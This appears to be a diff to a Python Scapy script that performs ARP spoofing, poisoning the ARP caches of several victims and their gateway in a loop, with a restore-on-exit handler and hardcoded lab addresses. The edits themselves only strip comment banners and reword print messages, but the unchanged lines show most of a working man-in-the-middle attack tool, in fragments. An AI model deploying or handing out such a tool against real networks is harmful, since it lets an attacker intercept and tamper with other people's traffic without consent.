@@ -22,9 +22,6 @@ import argparse
 # =====================================
 
 
-# ================================
-# Function: Get MAC from IP
-# ================================
 def get_mac(ip, interface):
     """
     Sends an ARP request and returns the MAC address for a given IP.
@@ -36,17 +33,14 @@ def get_mac(ip, interface):
 
     answered = srp(packet, timeout=2, verbose=False, iface=interface)[0]  # Send and wait for reply
     if answered:
-        print("[!] Response for IP")
+        print("! Response for IP")
         print(ip)
         return answered[0][1].hwsrc  # Return the MAC from the reply
     else:
-        print('[!] No response for IP')
+        print('! No response for IP')
         print(ip)
         sys.exit(1)
 
-# ================================
-# Function: Send ARP Spoof Packet
-# ================================
 def spoof(victim_ip, victim_mac, spoof_ip, interface):
     """
     Sends a spoofed ARP reply to a victim to trick them.
@@ -58,9 +52,7 @@ def spoof(victim_ip, victim_mac, spoof_ip, interface):
     packet = ether/arp
     sendp(packet, verbose=False, iface=interface)
 
-# ================================
-# Function: Restore ARP Table
-# ================================
+
 def restore(victim_ip, victim_mac, real_ip, real_mac, interface):
     """
     Sends the correct ARP reply to fix the ARP table after poisoning
@@ -79,9 +71,8 @@ def stop(sig, frame):
         restore(gateway_ip, mac_gateway, ip, mac, iface)
     #print("Network restored.")
     sys.exit(0)
-# ================================
-# Main Program Entry Point
-# ================================
+
+
 def main():
     # --- Command-line Interface ---
     parser = argparse.ArgumentParser(description="Multi-Host ARP Spoofing Tool with Operational Modes")
@@ -108,7 +99,7 @@ def main():
 
     # --- Get MAC Addresses of M1,M2 for testing puposes---
     if args.manual:
-        print("[*] Using hardcoded MAC addresses (manual mode).")
+        print("* Using hardcoded MAC addresses (manual mode).")
         hardcoded_victims = {
             "192.168.56.101": "08:00:27:B7:C4:AF",
             "192.168.56.102": "08:00:27:CC:08:6F",
@@ -117,7 +108,7 @@ def main():
         mac_gateway = "08:00:27:CC:08:6F"
         victim_macs = {ip: hardcoded_victims[ip] for ip in victim_ips}
     else:
-        print("[*] Resolving MAC addresses dynamically...")
+        print("* Resolving MAC addresses dynamically...")
         mac_gateway = get_mac(gateway_ip, iface)
         victim_macs = {ip: get_mac(ip, iface) for ip in victim_ips}
 
@@ -131,11 +122,9 @@ def main():
             spoof(gateway_ip, mac_gateway, ip, iface)   # Tell gateway: "Victim is at my MAC"
         time.sleep(sleep_time)
 
-# ================================
-# Run If Executed as Script
-# ================================
+
 if __name__ == "__main__":
     if os.geteuid() != 0:
-        print("Please run this script as root (sudo).")
+        print("Run script as root (sudo).")
         sys.exit(1)
     main()
